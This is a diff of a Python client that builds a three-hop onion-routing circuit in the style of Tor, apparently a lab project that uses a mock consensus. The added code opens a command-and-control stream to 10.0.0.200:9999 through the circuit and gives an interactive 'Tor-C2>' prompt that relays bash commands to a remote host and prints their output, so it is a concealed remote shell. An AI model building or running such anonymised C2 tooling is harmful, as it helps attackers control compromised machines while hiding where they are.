@@ -76,15 +76,10 @@ def node_info(node: dict):
     return node_ip, node_port
 
 
-def TLS_with_guard(ip:str, port: int):
-    try: 
-        raw_guard_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        context = ssl._create_unverified_context()
-        ssl_guard_sock = context.wrap_socket(raw_guard_sock, server_hostname=ip)
-        ssl_guard_sock.connect((ip, port))
-        return ssl_guard_sock
-    except Exception as e:
-        print(f"Unable to establish TLS connection with {ip}:{port}: {e}")
+def connect_to_guard(ip:str, port: int):
+    raw_guard_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    raw_guard_sock.connect((ip, port))
+    return raw_guard_sock
 
 
 def generate_new_circID() -> int:
@@ -103,59 +98,43 @@ def circuit_init() -> int:
         "status": "BUILDING",
         "tmp_private_key" : None,
         "hops" : [],
-        "listener_event": threading.Event()
+        "hop_ready_event": threading.Event(),
+        "c2_connected_event": threading.Event()
     }
     
     return circID
     
 
-def build_new_circuit(guard_sslsock : ssl.SSLSocket):
-
+def build_new_circuit(guard_sock):
     circID = circuit_init()
-    
     for i in range(3):
-        if(not add_hop(circID, guard_sslsock)):
-            print("add_hop failed. Exiting")
-            return None
-        
-    
+        if(not add_hop(circID, guard_sock)): return None
     circuits[circID]["status"] = "ACTIVE" 
-    print(f"Circuit {circID} is active")      
-    
+    print(f"Circuit {circID} is active. 3-HOP TUNNEL BUILT")      
+    return circID
 
 def build_CREATE2_cell(circID: int, public_key : bytes) -> bytes:
-    HTYPE = 2
-    HLEN = len(public_key)
-    create_payload = struct.pack(">HH32s", HTYPE,HLEN,public_key)
-    create_cell = cell.pack_cell(circID,cell.CellCmd.CREATE,create_payload)
-    return create_cell
-
+    create_payload = struct.pack(">HH32s", 2, len(public_key), public_key)
+    return cell.pack_cell(circID, cell.CellCmd.CREATE, create_payload)
 
 def build_EXTEND_cell_payload(ip : str, port : int, public_key : bytes) -> bytes:
     dest_ip = socket.inet_aton(ip)
-    relay_cell_payload = struct.pack(">4sH32s",dest_ip,port, public_key)
-    return relay_cell_payload
+    return struct.pack(">4sH32s", dest_ip, port, public_key)
 
 def build_EXTEND_cell_for_Middle(circID: int, circuit_status :dict, public_key:bytes) -> bytes:
     middle_relay = selected_relays[1]
     middle_relay_ip, middle_relay_port = node_info(middle_relay)
-
-    extend_relay_payload = build_EXTEND_cell_payload(middle_relay_ip,middle_relay_port,public_key)
+    extend_relay_payload = build_EXTEND_cell_payload(middle_relay_ip, middle_relay_port, public_key)
     fwd_hash_machine = circuit_status["hops"][0]["fwd_digest"]
     raw_extend_relay_cell = cell.pack_relayCell_with_digest(relayCmds.EXTEND,0,extend_relay_payload,fwd_hash_machine)
-    
     fwd_aes_machine = circuit_status["hops"][0]["fwd_cipher"]
     encrypted_extend_relay_cell = fwd_aes_machine.update(raw_extend_relay_cell)
-    
-    encrypted_extend_circuit_cell = cell.pack_cell(circID,cellCmds.RELAY,encrypted_extend_relay_cell)
-    return encrypted_extend_circuit_cell
-    
+    return cell.pack_cell(circID, cellCmds.RELAY, encrypted_extend_relay_cell)
     
 def build_EXTEND_cell_for_Exit(circID: int, circuit_status :dict, public_key:bytes) -> bytes:
-    exit_relay = selected_relays[1]
+    exit_relay = selected_relays[2]
     exit_relay_ip, exit_relay_port = node_info(exit_relay)
-
-    extend_relay_payload = build_EXTEND_cell_payload(exit_relay_ip,exit_relay_port,public_key)
+    extend_relay_payload = build_EXTEND_cell_payload(exit_relay_ip, exit_relay_port, public_key)
     fwd_hash_machine = circuit_status["hops"][1]["fwd_digest"]
     raw_extend_relay_cell = cell.pack_relayCell_with_digest(relayCmds.EXTEND,0,extend_relay_payload,fwd_hash_machine)
     
@@ -164,214 +143,150 @@ def build_EXTEND_cell_for_Exit(circID: int, circuit_status :dict, public_key:byt
     
     guard_fwd_aes_machine = circuit_status["hops"][0]["fwd_cipher"]
     final_encrypted_extend_relay_cell = guard_fwd_aes_machine.update(encrypted_extend_relay_cell)
-    encrypted_extend_circuit_cell = cell.pack_cell(circID,cellCmds.RELAY,final_encrypted_extend_relay_cell)
-    return encrypted_extend_circuit_cell
+    return cell.pack_cell(circID, cellCmds.RELAY, final_encrypted_extend_relay_cell)
 
-def add_hop(circID: int, guard_sslsock : ssl.SSLSocket):
-
+def add_hop(circID: int, guard_sock):
     circuit_status = circuits[circID]
     private_key, public_key = crypto.generate_ecdh_keypair()
     circuits[circID]["tmp_private_key"] = private_key
-    circuit_status["listener_event"].clear()
+    circuit_status["hop_ready_event"].clear()
 
     hops_len = len(circuit_status["hops"])
-
     if hops_len == 0:
-        create_cell = build_CREATE2_cell(circID, public_key)
-        guard_sslsock.sendall(create_cell)
-    
+        guard_sock.sendall(build_CREATE2_cell(circID, public_key))
     elif hops_len == 1:
-        encrypted_extend_circuit_cell = build_EXTEND_cell_for_Middle(circID, circuit_status,public_key)
-        guard_sslsock.sendall(encrypted_extend_circuit_cell)
-
+        guard_sock.sendall(build_EXTEND_cell_for_Middle(circID, circuit_status,public_key))
     elif hops_len == 2:
-        encrypted_extend_circuit_cell = build_EXTEND_cell_for_Exit(circID, circuit_status,public_key)
-        guard_sslsock.sendall(encrypted_extend_circuit_cell)    
+        guard_sock.sendall(build_EXTEND_cell_for_Exit(circID, circuit_status,public_key))    
 
-   
     success = circuit_status["hop_ready_event"].wait(timeout=5.0)
-    if not success:
-        print(f"Unable to build hop {hops_len + 1} for circuit")
-        return False
-        
+    if not success: return False
     print(f"Hop {hops_len + 1} is created")
     return True
     
 def decrypt_relay_cell(circ_data,relay_cell):
     constructed_hops = circ_data["hops"]
-    constructed_hops_len = len(constructed_hops)
     digest_machine = constructed_hops[-1]["bwd_digest"]
-    for i in range(constructed_hops_len):
+    decrypted_relay_cell = relay_cell
+    for i in range(len(constructed_hops)):
         decryption_cipher = constructed_hops[i]["bwd_cipher"]
-        decrypted_relay_cell = decryption_cipher.update(relay_cell)
-    
-    return decrypted_relay_cell,digest_machine
-
-    
-    
+        decrypted_relay_cell = decryption_cipher.update(decrypted_relay_cell)
+    return decrypted_relay_cell, digest_machine
+  
 def handle_public_key(circ_data,relay_pub_key):
     try:
         shared_secret = crypto.compute_shared_secret(circ_data["tmp_private_key"], relay_pub_key)
-        fwd_digest_key, bwd_digest_key, fwd_aes_key, bwd_aes_key = crypto.derive_tor_keys(circ_data, shared_secret)
-
+        fwd_digest_key, bwd_digest_key, fwd_aes_key, bwd_aes_key = crypto.derive_tor_keys(shared_secret)
         circ_data["tmp_private_key"] = None
-
-
         fwd_cipher, bwd_cipher = crypto.create_client_ciphers(fwd_aes_key, bwd_aes_key)
         fwd_digest, bwd_digest = crypto.create_running_digests()
-
-        fwd_digest.update(fwd_digest_key)
-        bwd_digest.update(bwd_digest_key)
-
-        new_hop = {
-            "fwd_cipher": fwd_cipher,
-            "bwd_cipher": bwd_cipher,
-            "fwd_digest": fwd_digest,
-            "bwd_digest": bwd_digest
-        }
-
-        circ_data["hops"].append(new_hop)
-
+        fwd_digest.update(fwd_digest_key); bwd_digest.update(bwd_digest_key)
+        circ_data["hops"].append({"fwd_cipher": fwd_cipher, "bwd_cipher": bwd_cipher, "fwd_digest": fwd_digest, "bwd_digest": bwd_digest})
         circ_data["hop_ready_event"].set()
     except Exception as e:
-        print(f"Error when deriving relay public key : {e}")
-    
+        print(f"Error deriving relay public key : {e}")
 
-     
 def handle_RELAY(circ_data,recvd_relay_cell):
-    decrypted_relay_cell,digest_machine = decrypt_relay_cell(circ_data,recvd_relay_cell)
-    relayCmd, recognized, streamID,digest,length,data = cell.unpack_relay_cell(decrypted_relay_cell)
+    decrypted_relay_cell, digest_machine = decrypt_relay_cell(circ_data,recvd_relay_cell)
+    relayCmd, recognized, streamID, digest, length, data = cell.unpack_relay_cell(decrypted_relay_cell)
     
-    if((not cell.verify_relay_cell(digest_machine,decrypted_relay_cell)) or recognized != 0):
+    if((not cell.verify_relay_cell(decrypted_relay_cell, digest_machine)) or recognized != 0):
         print("handle_RELAY(): Digest not matched")
         return None
     
-    
-    if(relayCmd == relayCmds.EXTENDED):
-        relay_public_key = data[:32]
-        handle_public_key(circ_data, relay_public_key)
-        
-        
-    
+    if relayCmd == relayCmds.EXTENDED:
+        handle_public_key(circ_data, data[:32])
+    elif relayCmd == relayCmds.CONNECTED:
+        circ_data["c2_connected_event"].set()
+    elif relayCmd == relayCmds.DATA:
+        output = data[:length].decode('utf-8')
+        print(output, end="")
+
 def handle_CREATED(circ_data, payload):
     HTYPE,HLEN = struct.unpack(">HH",payload[:4])
-    assert HTYPE == 2, "Invalid HTYPE"
-    assert HLEN == 32, "Invalid Key Length"
     relay_pub_key = payload[4:4+HLEN]
-    assert len(relay_pub_key) == 32, "Invalid Key Length"
-
-    
     
     shared_secret = crypto.compute_shared_secret(circ_data["tmp_private_key"], relay_pub_key)
-    fwd_digest_key, bwd_digest_key, fwd_aes_key, bwd_aes_key = crypto.derive_tor_keys(circ_data, shared_secret)
-
+    fwd_digest_key, bwd_digest_key, fwd_aes_key, bwd_aes_key = crypto.derive_tor_keys(shared_secret)
     circ_data["tmp_private_key"] = None
-
    
     fwd_cipher, bwd_cipher = crypto.create_client_ciphers(fwd_aes_key, bwd_aes_key)
     fwd_digest, bwd_digest = crypto.create_running_digests()
-
-    fwd_digest.update(fwd_digest_key)
-    bwd_digest.update(bwd_digest_key)
+    fwd_digest.update(fwd_digest_key); bwd_digest.update(bwd_digest_key)
 
     new_hop = {
         "role" : "Guard",
         "ip" : selected_relays[0]["IP"],
         "port": selected_relays[0]["port"],
-        "fwd_cipher": fwd_cipher,
-        "bwd_cipher": bwd_cipher,
-        "fwd_digest": fwd_digest,
-        "bwd_digest": bwd_digest
+        "fwd_cipher": fwd_cipher, "bwd_cipher": bwd_cipher,
+        "fwd_digest": fwd_digest, "bwd_digest": bwd_digest
     }
-
     circ_data["hops"].append(new_hop)
-    
     circ_data["hop_ready_event"].set()
 
-    print(f"Added new hop to circuit {circ_data}")
-
-
-
-
-
-
-def listen_to_guard(guard_sslsock:ssl.SSLSocket):
-    print("Socket thread listening")
+def listen_to_guard(guard_sock):
     try:
         while True:
-            cell = guard_sslsock.recv(512)
-            circID, cellCmd, payload = struct.unpack(">HB509s", cell)
-            circ_data = selected_relays[circID]
+            raw_cell = guard_sock.recv(512)
+            if not raw_cell: break
+            circID, cellCmd, payload = cell.unpack_cell(raw_cell)
+            circ_data = circuits[circID]
             
             if cellCmd == cellCmds.CREATED:
-                print("Received CREATED cell ")
                 handle_CREATED(circ_data,payload)
-                
             elif cellCmd == cellCmds.RELAY:
-                print("Received RELAY cell")
                 handle_RELAY(circ_data,payload)
-            
-            elif cellCmd == cellCmds.DESTROY:
-                print("Received DESTROY cell")
-                
-            else:
-                print("Unknown command, discarding")
-                
-    except Exception as e:
-        print(f"Socket listener failed : {e}")
-        
-        
-    
+    except: pass
             
 def init():
-    #Node selection
+    global selected_relays
     selected_relays = select_relays(MOCK_CONSENSUS)
-    print(f"Selected Relays are: {select_relays}")
-    if(selected_relays == None):
-        print("Program Ended : Not Enough available relays")
-    
-    #TLS with guard
+    if not selected_relays: return
     
     guard = selected_relays[0]
-    print(f"Starting TLS connection with {guard}")
     guard_ip, guard_port = node_info(guard)
-    print(f"IP: {guard_ip} Port: {guard_port}")
-    guard_sslsock = TLS_with_guard(guard_ip, guard_port)
-    if(guard_sslsock != None):
-        print("Successfully connected with Guard")
+    guard_sock = connect_to_guard(guard_ip, guard_port)
     
-    listener_thread = threading.Thread(
-        target=listen_to_guard, args=(guard_sslsock,), daemon=True               
-    )
-    listener_thread.start()
+    threading.Thread(target=listen_to_guard, args=(guard_sock,), daemon=True).start()
 
-    print("Socket thread created")
-    print("Building a new circuit")
-    new_circID = build_new_circuit(guard_sslsock)
-    if(new_circID == None):
-        print("Unable to create new circuit. Exiting")
-        return 
+    new_circID = build_new_circuit(guard_sock)
+    if new_circID == None: return 
     
+    circ_data = circuits[new_circID]
+    print("Sending BEGIN to open C2 stream on 10.0.0.200:9999...")
+    
+    begin_dest = b"10.0.0.200:9999\x00"
+    exit_fwd_hash = circ_data["hops"][2]["fwd_digest"]
+    raw_begin_cell = cell.pack_relayCell_with_digest(relayCmds.BEGIN, 1, begin_dest, exit_fwd_hash)
+    
+    enc_payload = raw_begin_cell
+    for i in reversed(range(3)):
+        enc_payload = circ_data["hops"][i]["fwd_cipher"].update(enc_payload)
+        
+    guard_sock.sendall(cell.pack_cell(new_circID, cellCmds.RELAY, enc_payload))
+    
+    if not circ_data["c2_connected_event"].wait(timeout=5.0):
+        print("C2 Connection timed out.")
+        return
+        
+    print("C2 Stream CONNECTED. You can now type bash commands.")
+    print("-" * 50)
+    
+    while True:
+        cmd_input = input("Tor-C2> ")
+        if cmd_input.lower() in ['exit', 'quit']: break
+        if not cmd_input: continue
+
+        cmd_bytes = cmd_input.encode('utf-8')
+        exit_fwd_hash = circ_data["hops"][2]["fwd_digest"]
+        raw_data_cell = cell.pack_relayCell_with_digest(relayCmds.DATA, 1, cmd_bytes, exit_fwd_hash)
+        
+        enc_payload = raw_data_cell
+        for i in reversed(range(3)):
+            enc_payload = circ_data["hops"][i]["fwd_cipher"].update(enc_payload)
+            
+        guard_sock.sendall(cell.pack_cell(new_circID, cellCmds.RELAY, enc_payload))
+        time.sleep(0.5)
 
 if __name__ == "__main__":
     init()
-   
-    
-    
-            
-    
-        
-
-        
-        
-
-        
-        
-        
-        
-    
-    
-    
-    
-    
-    
